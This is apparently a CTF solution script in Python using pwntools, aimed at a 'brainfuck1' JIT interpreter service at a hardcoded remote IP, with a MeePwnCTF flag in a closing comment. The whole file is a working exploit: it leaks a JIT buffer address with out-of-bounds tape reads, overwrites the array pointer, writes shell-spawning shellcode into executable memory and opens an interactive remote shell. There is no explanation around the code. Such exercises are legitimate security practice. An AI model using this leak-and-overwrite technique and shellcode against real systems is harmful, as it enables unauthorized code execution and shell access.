#!/usr/bin/python

from pwn import *

from binascii import hexlify, unhexlify

def leak_addr(r):
        r.sendline('<.'*40)
        res = ""

        for i in range(40):
                res += r.recv(1)

        return res[-8:]


def overwrite_array(jitbuffer_addr):
        r.sendline(48*'<' + ',>'*8)
        jitbuffer_addr = int(hexlify(jitbuffer_addr), 16)
        jitbuffer_addr = unhexlify("%016x" % (jitbuffer_addr + 11))
        r.send(jitbuffer_addr[::-1])

context(arch = 'amd64', os = 'linux')


#r = process('./brainfuck1')

r = remote('139.59.244.42', 31337)

r.recvuntil('>> ')

print('[+] Leaking jit buffer address')

jitbuffer_addr = leak_addr(r)

print('[+] Jit buffer address = ' + hexlify(jitbuffer_addr))

print("[+] Overwriting array address with jit buffer address + len(prologue)")

overwrite_array(jitbuffer_addr)

r.recvuntil('>> ')

sh = asm(shellcraft.sh())

print("[+] Writing shellcode in jit buffer")

r.sendline('[' + ',>'*len(sh) + ']')

r.send(sh)

r.interactive()

r.close()

# MeePwnCTF{this_is_simple_challenge_:banana-dance:}
